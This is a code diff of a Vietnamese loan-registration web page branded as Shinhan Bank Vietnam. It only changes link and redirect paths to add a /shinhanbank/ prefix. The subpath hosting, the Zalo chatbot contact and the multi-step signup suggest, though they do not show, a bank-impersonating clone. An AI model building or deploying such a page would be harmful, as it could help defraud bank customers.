@@ -1207,27 +1207,27 @@
                     </button>
                 </div>
                 <div class="hamburger-menu-items">
-                    <a href="/pages/vi/trang-chu.html" class="hamburger-menu-item">
+                    <a href="/shinhanbank/pages/vi/trang-chu.html" class="hamburger-menu-item">
                         <i class="fas fa-home"></i>
                         <span>Trang Chủ</span>
                     </a>
-                    <a href="/pages/vi/gioi-thieu.html" class="hamburger-menu-item">
+                    <a href="/shinhanbank/pages/vi/gioi-thieu.html" class="hamburger-menu-item">
                         <i class="fas fa-info-circle"></i>
                         <span>Giới Thiệu</span>
                     </a>
-                    <a href="/pages/vi/ca-nhan.html" class="hamburger-menu-item">
+                    <a href="/shinhanbank/pages/vi/ca-nhan.html" class="hamburger-menu-item">
                         <i class="fas fa-star"></i>
                         <span>Lợi Ích</span>
                     </a>
-                    <a href="/pages/vi/lai-suat-tien-gui.html" class="hamburger-menu-item">
+                    <a href="/shinhanbank/pages/vi/lai-suat-tien-gui.html" class="hamburger-menu-item">
                         <i class="fas fa-file-alt"></i>
                         <span>Giấy Tờ Cần Thiết</span>
                     </a>
-                    <a href="/pages/vi/dieu-khoan-su-dung.html" class="hamburger-menu-item">
+                    <a href="/shinhanbank/pages/vi/dieu-khoan-su-dung.html" class="hamburger-menu-item">
                         <i class="fas fa-gavel"></i>
                         <span>Điều Khoản Sử Dụng</span>
                     </a>
-                    <a href="/pages/vi/support-center.html" class="hamburger-menu-item">
+                    <a href="/shinhanbank/pages/vi/support-center.html" class="hamburger-menu-item">
                         <i class="fas fa-headset"></i>
                         <span>Liên Hệ</span>
                     </a>
@@ -1641,7 +1641,7 @@
             <div class="form-check">
                 <input class="form-check-input" type="checkbox" id="privacyConsent" name="privacyConsent" required>
                 <label class="form-check-label" for="privacyConsent">
-                    Tôi đồng ý với <a href="/pages/vi/chinh-sach-bao-mat.html" target="_blank">Chính sách bảo mật</a> và <a href="/pages/vi/dieu-khoan-su-dung.html" target="_blank">Điều khoản sử dụng</a>.
+                    Tôi đồng ý với <a href="/shinhanbank/pages/vi/chinh-sach-bao-mat.html" target="_blank">Chính sách bảo mật</a> và <a href="/shinhanbank/pages/vi/dieu-khoan-su-dung.html" target="_blank">Điều khoản sử dụng</a>.
                 </label>
                 <div class="invalid-feedback" id="privacyConsentError"></div>
             </div>
@@ -1669,9 +1669,9 @@
 
     <div class="footer">
         <div class="footer-links">
-            <a href="/pages/vi/chinh-sach-bao-mat.html">Chính sách bảo mật</a> |
+            <a href="/shinhanbank/pages/vi/chinh-sach-bao-mat.html">Chính sách bảo mật</a> |
             <a href="https://chatbot.zalo.me/ref/3932037504673339016?id=kichhoattuvan">Liên hệ</a> |
-            <a href="/pages/vi/dieu-khoan-su-dung.html">Điều khoản sử dụng</a>
+            <a href="/shinhanbank/pages/vi/dieu-khoan-su-dung.html">Điều khoản sử dụng</a>
         </div>
         <p class="mt-2">Bản quyền © 2017 thuộc về Ngân hàng TNHH MTV SHINHAN Việt Nam. Mọi quyền được bảo lưu.</p>
     </div>
@@ -2438,7 +2438,7 @@
                         
                         showSecureAlert('Đăng ký thành công! Đang chuyển hướng...', 'success');
                         setTimeout(() => {
-                            window.location.href = '/pages/vi/step2.html';
+                            window.location.href = '/shinhanbank/pages/vi/step2.html';
                         }, 3000);
                     } else {
                         throw new Error('Failed to save data to localStorage');
@@ -2471,14 +2471,14 @@
                     // Đã hoàn thành step8, chuyển đến step5
                     showSecureAlert('Bạn đã hoàn thành đăng ký vay. Đang chuyển đến trang thông tin khoản vay...', 'info');
                     setTimeout(() => {
-                        window.location.href = '/pages/vi/step5.html';
+                        window.location.href = '/shinhanbank/pages/vi/step5.html';
                     }, 2000);
                     return;
                 }
                 
                 if (currentStep > 1) {
                     // Đang trong quá trình đăng ký, chuyển đến step hiện tại
-                    const stepUrl = `/pages/vi/step${currentStep}.html`;
+                    const stepUrl = `/shinhanbank/pages/vi/step${currentStep}.html`;
                     showSecureAlert(`Bạn đang ở bước ${currentStep} trong quá trình đăng ký. Đang chuyển đến bước tiếp theo...`, 'info');
                     setTimeout(() => {
                         window.location.href = stepUrl;
@@ -2841,6 +2841,7 @@
     </script>
 </body>
 </html>
+
 
 
 
